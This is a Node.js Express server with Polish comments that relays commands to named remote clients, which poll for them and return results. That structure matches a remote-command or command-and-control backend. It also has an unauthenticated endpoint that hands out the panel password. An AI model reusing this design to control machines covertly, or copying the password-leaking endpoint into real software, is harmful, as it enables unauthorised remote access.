import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

// 📁 Wczytywanie ścieżki i dotenv (lokalnie, Render i tak ustawia env-y sam)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Dotenv tylko lokalnie
if (process.env.NODE_ENV !== 'production') {
  dotenv.config();
}

const app = express();
const port = process.env.PORT || 3000;

// 📌 Render.com → zmienne wpisujesz w zakładce "Environment"
const API_TOKEN = process.env.API_TOKEN;
const PANEL_PASSWORD = process.env.PANEL_PASSWORD;

if (!API_TOKEN || !PANEL_PASSWORD) {
  console.error("❌ Brak wymaganych zmiennych środowiskowych (API_TOKEN lub PANEL_PASSWORD).");
  process.exit(1);
}

const commands = {};
const results = {};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 🛡️ Middleware autoryzacyjny
function authMiddleware(req, res, next) {
  const token = req.headers['authorization'];
  if (token !== `Bearer ${API_TOKEN}`) {
    return res.status(403).send('Forbidden – nieprawidłowy token');
  }
  next();
}

// 🔐 Endpoint do odczytania hasła panelowego (frontend go pobiera do logowania)
app.get('/password', (req, res) => {
  res.json({ password: PANEL_PASSWORD });
});

// API: Wysyłanie komendy
app.post('/command', authMiddleware, (req, res) => {
  const { command, client } = req.body;
  if (!command || !client) return res.status(400).send('Brakuje danych');
  commands[client] = command;
  res.sendStatus(200);
});

// API: Pobieranie komendy (polling)
app.get('/command', authMiddleware, (req, res) => {
  const client = req.query.client;
  const cmd = commands[client];
  if (cmd) {
    delete commands[client];
    return res.send(cmd);
  }
  res.status(204).send(); // brak komendy
});

// API: Przesyłanie wyniku
app.post('/result', authMiddleware, (req, res) => {
  const { result, client } = req.body;
  if (!result || !client) return res.status(400).send('Brakuje danych');
  results[client] = result;
  res.sendStatus(200);
});

// API: Odbieranie wyniku (frontend)
app.get('/result', authMiddleware, (req, res) => {
  const client = req.query.client;
  const r = results[client];
  if (r) {
    delete results[client];
    return res.send(r);
  }
  res.status(204).send(); // brak wyniku
});

app.listen(port, () => {
  console.log(`✅ Serwer działa na porcie ${port}`);
});
